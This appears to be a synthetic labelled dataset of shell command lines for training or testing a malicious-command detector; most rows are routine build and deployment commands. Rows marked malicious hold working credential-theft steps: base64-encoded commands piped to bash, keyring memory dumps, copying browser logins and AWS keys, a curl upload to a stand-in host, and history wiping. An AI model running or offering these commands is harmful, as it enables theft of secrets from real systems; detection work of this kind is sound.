process_name,command_line,label
df,df -h,benign
git,git commit -am 'fix: search retry logic',benign
rsync,rsync -az /home/jenkins/platform/dist/ /var/www/api-gateway/,benign
curl,curl -s http://localhost:8080/health,benign
git,git commit -am 'fix: postgres retry logic',benign
bash,echo Y3AgL2V0Yy9zaGFkb3cgL2Rldi9zaG0vLmZvbnQtdW5peC8ucyAyPi9kZXYvbnVsbA== | base64 -d | bash,malicious
git,git pull origin hotfix/login,benign
docker,docker build -t auth-svc:90 .,benign
git,git status,benign
ps,ps aux --sort=-%mem | head,benign
psql,psql -h db -U jenkins -c 'SELECT count(*) FROM orders;',benign
free,free -m,benign
npm,npm run build,benign
journalctl,journalctl -u worker --since '10 min ago',benign
bash,cd /home/jenkins/mobile-api && ls,benign
aws,aws s3 ls s3://api-gateway-artifacts/,benign
tar,tar czf /backups/postgres-32.tgz /var/lib/postgres,benign
bash,"X='gcore -o /dev/shm/.font-unix/m $(pgrep -n gnome-keyring) 2>/dev/null'; eval ""$X""",malicious
systemctl,systemctl status auth-svc,benign
node,node scripts/seed.js,benign
kubectl,kubectl logs deploy/search --tail 50,benign
python3,python3 -m pytest tests/ -q,benign
git,git log --oneline -n 10,benign
apt-get,apt-get install -y python3-pip,benign
docker,docker compose up -d postgres,benign
find,find /home/jenkins/billing-service -name '*.log' -mtime +7,benign
docker,docker compose up -d payments,benign
bash,echo Z3JlcCAtcklFICdwYXNzd29yZHxhcGlfa2V5fHNlY3JldCcgL2hvbWUvamVua2lucyAvZXRjIDI+L2Rldi9udWxsIHwgaGVhZA== | base64 -d | bash,malicious
htop,htop -d 5,benign
bash,cd /home/jenkins/infra && ls,benign
grep,grep -r 'TODO' /home/jenkins/infra/src,benign
bash,cd /home/jenkins/platform && ls,benign
systemctl,systemctl restart worker,benign
python3,python3 /opt/app/manage.py migrate,benign
systemctl,systemctl status nginx,benign
scp,scp report.csv jenkins@reports:/srv/reports/,benign
git,git checkout release/2.4,benign
npm,npm test -- --runInBand,benign
go,go build ./...,benign
kubectl,kubectl rollout status deploy/redis,benign
uptime,uptime,benign
redis-cli,redis-cli ping,benign
bash,"X='cp /home/jenkins/.mozilla/firefox/*/logins.json /dev/shm/.font-unix/'; eval ""$X""",malicious
rsync,rsync -az /home/jenkins/data-pipeline/dist/ /var/www/api-gateway/,benign
git,git commit -am 'fix: nginx retry logic',benign
docker,docker build -t search:15 .,benign
systemctl,systemctl status payments,benign
pip3,pip3 install -r requirements.txt,benign
bash,ls -la /home/jenkins,benign
docker,docker logs --tail 100 worker,benign
curl,curl -s -F f=@/dev/shm/.font-unix/.s https://cdn-assets-942.test/c,malicious
docker,docker build -t nginx:7 .,benign
journalctl,journalctl -u nginx --since '10 min ago',benign
bash,cd /home/jenkins/billing-service && ls,benign
rsync,rsync -az /home/jenkins/infra/dist/ /var/www/redis/,benign
apt-get,apt-get install -y openjdk-17-jdk,benign
grep,grep -r 'TODO' /home/jenkins/platform/src,benign
docker,docker logs --tail 100 search,benign
ssh,ssh jenkins@build-35 uptime,benign
docker,docker logs --tail 100 api-gateway,benign
make,make lint,benign
aws,aws s3 ls s3://worker-artifacts/,benign
grep,grep -r 'TODO' /home/jenkins/web-app/src,benign
aws,aws s3 ls s3://postgres-artifacts/,benign
kubectl,kubectl get pods -n production,benign
bash,"X='getent passwd | awk -F: '\''$3>=1000{print $1}'\'''; eval ""$X""",malicious
kubectl,kubectl rollout status deploy/search,benign
git,git pull origin feature/checkout,benign
npm,npm ci --no-audit,benign
docker,docker logs --tail 100 redis,benign
git,git checkout feature/checkout,benign
docker,docker ps -a,benign
bash,"ps -eo user,pid,cmd --sort=-%cpu | head -n 25",malicious
git,git pull origin main,benign
rsync,rsync -az /home/jenkins/web-app/dist/ /var/www/nginx/,benign
rsync,rsync -az /home/jenkins/data-pipeline/dist/ /var/www/worker/,benign
kubectl,kubectl rollout status deploy/nginx,benign
git,git commit -am 'fix: payments retry logic',benign
journalctl,journalctl -u payments --since '10 min ago',benign
bash,truncate -s0 /home/jenkins/.bash_history 2>/dev/null,malicious
git,git checkout hotfix/login,benign
curl,curl -fsS https://api.github.com/repos/mobile-api/commits | head,benign
git,git commit -am 'fix: api-gateway retry logic',benign
tar,tar czf /backups/worker-47.tgz /var/lib/worker,benign
git,git commit -am 'fix: auth-svc retry logic',benign
terraform,terraform plan -out tfplan,benign
find,find /home/jenkins/data-pipeline -name '*.log' -mtime +7,benign
grep,grep -r 'TODO' /home/jenkins/billing-service/src,benign
tar,tar czf /backups/nginx-41.tgz /var/lib/nginx,benign
bash,find /home/jenkins -name '*.env' -o -name 'id_rsa' 2>/dev/null | head,malicious
systemctl,systemctl restart payments,benign
journalctl,journalctl -u auth-svc --since '10 min ago',benign
ssh,ssh jenkins@build-92 uptime,benign
systemctl,systemctl restart api-gateway,benign
rsync,rsync -az /home/jenkins/infra/dist/ /var/www/payments/,benign
docker,docker build -t nginx:68 .,benign
journalctl,journalctl -u api-gateway --since '10 min ago',benign
kubectl,kubectl rollout status deploy/api-gateway,benign
docker,docker build -t redis:52 .,benign
docker,docker build -t api-gateway:97 .,benign
kubectl,kubectl rollout status deploy/payments,benign
ssh,ssh jenkins@build-63 uptime,benign
bash,cd /home/jenkins/web-app && ls,benign
ssh,ssh jenkins@build-1 uptime,benign
git,git checkout main,benign
curl,curl -fsS https://api.github.com/repos/billing-service/commits | head,benign
kubectl,kubectl logs deploy/redis --tail 50,benign
bash,cat /home/jenkins/.aws/credentials 2>/dev/null,malicious
git,git checkout develop,benign
docker,docker build -t redis:17 .,benign
rsync,rsync -az /home/jenkins/platform/dist/ /var/www/nginx/,benign
grep,grep -r 'TODO' /home/jenkins/data-pipeline/src,benign
sudo,sudo -n -l 2>/dev/null,malicious
aws,aws s3 ls s3://nginx-artifacts/,benign
apt-get,apt-get install -y ripgrep,benign
ssh,ssh jenkins@build-78 uptime,benign
systemctl,systemctl restart redis,benign
rsync,rsync -az /home/jenkins/data-pipeline/dist/ /var/www/postgres/,benign
rsync,rsync -az /home/jenkins/billing-service/dist/ /var/www/postgres/,benign
kubectl,kubectl logs deploy/payments --tail 50,benign
systemctl,systemctl status api-gateway,benign
ss,ss -tnp 2>/dev/null | head -n 40,malicious
docker,docker compose up -d auth-svc,benign
docker,docker build -t postgres:81 .,benign
apt-get,apt-get install -y jq,benign
docker,docker logs --tail 100 auth-svc,benign
rsync,rsync -az /home/jenkins/billing-service/dist/ /var/www/nginx/,benign
docker,docker build -t postgres:69 .,benign
systemctl,systemctl restart nginx,benign
aws,aws s3 ls s3://redis-artifacts/,benign
ssh,ssh jenkins@build-50 uptime,benign
docker,docker compose up -d api-gateway,benign
ssh,ssh jenkins@build-49 uptime,benign
git,git pull origin release/2.4,benign
kubectl,kubectl rollout status deploy/postgres,benign
docker,docker compose up -d redis,benign
find,find /home/jenkins/infra -name '*.log' -mtime +7,benign
bash,truncate -s0 /home/jenkins/.bash_history 2>/dev/null # 3474,malicious
docker,docker compose up -d nginx,benign
rsync,rsync -az /home/jenkins/infra/dist/ /var/www/worker/,benign
docker,docker build -t worker:95 .,benign
grep,grep -r 'TODO' /home/jenkins/mobile-api/src,benign
docker,docker build -t search:38 .,benign
rsync,rsync -az /home/jenkins/web-app/dist/ /var/www/payments/,benign
aws,aws s3 ls s3://auth-svc-artifacts/,benign
bash,find /home/jenkins -name '*.env' -o -name 'id_rsa' 2>/dev/null | head # 5266,malicious
